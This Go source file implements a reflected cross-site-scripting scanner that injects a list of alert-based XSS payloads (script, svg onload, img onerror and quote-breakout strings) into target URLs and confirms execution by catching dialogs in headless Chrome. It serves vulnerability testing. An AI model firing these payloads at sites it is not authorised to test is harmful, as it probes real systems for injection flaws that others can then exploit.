package scanner

import (
	"bugx/pkg/utils"
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
)

type XSSScanner struct{}

// generateCanaryToken creates a unique token for XSS verification
func generateCanaryToken() string {
	bytes := make([]byte, 6)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// XSS payloads designed to trigger JavaScript dialogs
// STRICT: Only using payloads that auto-execute without user interaction
// Each payload uses CANARY placeholder replaced with unique token
var xssVerificationPayloads = []string{
	// Auto-execute payloads (no user interaction required)
	`<script>alert('CANARY')</script>`,            // Basic script tag
	`<svg onload="alert('CANARY')">`,              // SVG onload (reliable)
	`<img src=x onerror="alert('CANARY')">`,       // IMG onerror (very reliable)
	`<body onload="alert('CANARY')">`,             // Body onload
	`<input onfocus="alert('CANARY')" autofocus>`, // Autofocus trigger
	`<video><source onerror="alert('CANARY')">`,   // Video source error
	`<details open ontoggle="alert('CANARY')">`,   // Details toggle auto

	// Context breakout payloads
	`"><script>alert('CANARY')</script>`,        // Double quote breakout
	`'><script>alert('CANARY')</script>`,        // Single quote breakout
	`</script><script>alert('CANARY')</script>`, // Script tag breakout

	// Attribute breakout with auto-execute
	`" onfocus="alert('CANARY')" autofocus="`,   // Attribute injection
	`' onfocus='alert(\"CANARY\")' autofocus='`, // Single quote attribute
}

func (s *XSSScanner) Scan(config ScanConfig) []ScanResult {
	var processor ResultProcessor
	var wg sync.WaitGroup
	sem := make(chan struct{}, config.Threads)

	fmt.Println(utils.Yellow("\n[i] Starting XSS Scan with Browser Dialog Interception..."))
	fmt.Println(utils.White("[*] Using Chrome Headless to detect alert/prompt/confirm"))
	fmt.Println(utils.White("[*] Only REAL JavaScript execution will be reported\n"))

	// Create shared browser context
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-web-security", true),
		chromedp.Flag("ignore-certificate-errors", true),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	// Use verification payloads or user payloads
	payloadsToTest := xssVerificationPayloads
	if len(config.Payloads) > 0 {
		// Add user payloads to verification payloads
		payloadsToTest = append(payloadsToTest, config.Payloads...)
	}

	for _, baseURL := range config.URLs {
		for _, payload := range payloadsToTest {
			wg.Add(1)
			sem <- struct{}{}
			go func(baseURL, payload string) {
				defer wg.Done()
				defer func() { <-sem }()

				// Generate unique canary
				canary := generateCanaryToken()
				testPayload := strings.ReplaceAll(payload, "CANARY", canary)
				targetURL := baseURL + testPayload

				// First, quick HTTP check
				resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
				if err != nil {
					return
				}

				// Check if canary is reflected
				if !strings.Contains(resp.Body, canary) {
					return
				}

				// Canary reflected - verify with browser
				confirmed, details := verifyXSSWithDialogInterception(allocCtx, targetURL, canary, config.Timeout)

				if confirmed {
					fmt.Printf("%s %s\n",
						utils.Red("[✓] XSS CONFIRMED:"),
						utils.Cyan(targetURL))
					fmt.Printf("    %s %s\n",
						utils.Green("→"),
						utils.White(details))

					processor.Add(ScanResult{
						URL:          targetURL,
						Vulnerable:   true,
						Payload:      testPayload,
						ResponseTime: resp.Duration,
						Details:      details,
					})
				}
			}(baseURL, payload)
		}
	}

	wg.Wait()
	printXSSSummary(processor.Results)
	return processor.Results
}

// verifyXSSWithDialogInterception uses Chrome's dialog event to confirm XSS
// STRICT MODE: Only confirms if our unique canary is in the dialog message
// This prevents false positives from legitimate JavaScript alerts on the page
func verifyXSSWithDialogInterception(allocCtx context.Context, targetURL, canary string, timeout int) (bool, string) {
	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	ctx, cancel = context.WithTimeout(ctx, time.Duration(timeout+10)*time.Second)
	defer cancel()

	dialogDetected := false
	dialogMessage := ""
	dialogType := ""

	// Listen for JavaScript dialog events (alert, confirm, prompt)
	chromedp.ListenTarget(ctx, func(ev interface{}) {
		switch e := ev.(type) {
		case *page.EventJavascriptDialogOpening:
			dialogDetected = true
			dialogMessage = e.Message
			dialogType = string(e.Type)
			// Dismiss the dialog to continue
			go func() {
				chromedp.Run(ctx, page.HandleJavaScriptDialog(true))
			}()
		}
	})

	// Navigate and wait for potential dialog
	err := chromedp.Run(ctx,
		chromedp.Navigate(targetURL),
		chromedp.Sleep(2*time.Second), // Increased back to 2s for better detection
	)

	if err != nil && !strings.Contains(err.Error(), "context deadline") {
		// Some errors are expected
	}

	if dialogDetected {
		// STRICT CHECK: Dialog message MUST contain our canary
		// This prevents false positives from existing JS alerts on the page
		if strings.Contains(dialogMessage, canary) {
			return true, fmt.Sprintf("JavaScript %s() triggered with canary: %s", dialogType, canary)
		}
		// Dialog detected but canary not present - NOT confirmed (could be legitimate alert)
		// Do NOT return true here - this is a potential false positive
		return false, ""
	}

	return false, ""
}

func truncateURL(url string, maxLen int) string {
	if len(url) <= maxLen {
		return url
	}
	return url[:maxLen-3] + "..."
}

func printXSSSummary(results []ScanResult) {
	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
	fmt.Println(utils.White("XSS Scan Summary (Dialog Interception):"))
	fmt.Printf("  %s Confirmed XSS (JavaScript Executed): %d\n", utils.Red("●"), len(results))
	fmt.Println(utils.Yellow("--------------------------------------------------"))

	if len(results) > 0 {
		fmt.Println(utils.Green("\n[!] All findings are 100% CONFIRMED - alert() was triggered!"))
	} else {
		fmt.Println(utils.Yellow("\n[i] No XSS vulnerabilities found that trigger JavaScript dialogs."))
	}
}
